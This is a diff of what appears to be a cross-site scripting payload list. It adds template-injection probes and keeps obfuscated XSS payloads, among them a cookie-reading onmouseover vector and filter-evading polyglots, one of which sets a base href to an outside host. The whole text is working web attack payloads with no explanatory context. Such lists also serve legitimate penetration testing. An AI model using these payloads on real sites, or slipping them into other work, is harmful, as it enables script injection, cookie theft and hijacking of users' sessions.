@@ -1,10 +1,12 @@
+‘“><img src=x>${{7+1}}
+'"><img src=x>${{7*2}}
 '';!--"<XSS>=&{()}
 
 <img src=x onerror="ქ=alert;ქ('XSS')">
 
 "><a nope%3d"%26quot%3bx%26quot%3b"onmouseover%3d"Reflect.get(frames,'ale'%2b'rt')(Reflect.get(document,'coo'%2b'kie'))">
 
-'"><img src=x>${{7*2}}
+
 1//%0Aalert?.(/Hunted/)//'/*\'/*"/*\"/*`/*\`/*&apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*S4/*/;{/8/(alert)(/Hunted/)}//>
 JavaScript://%250Aalert?.(/Hunted/)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/<Style/</Script/</textArea/</iFrame/<noScript>\74k<K/contentEditable/autofocus/OnFocus=/*${/*/;{/**/(alert)(/Hunted/)}//>
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
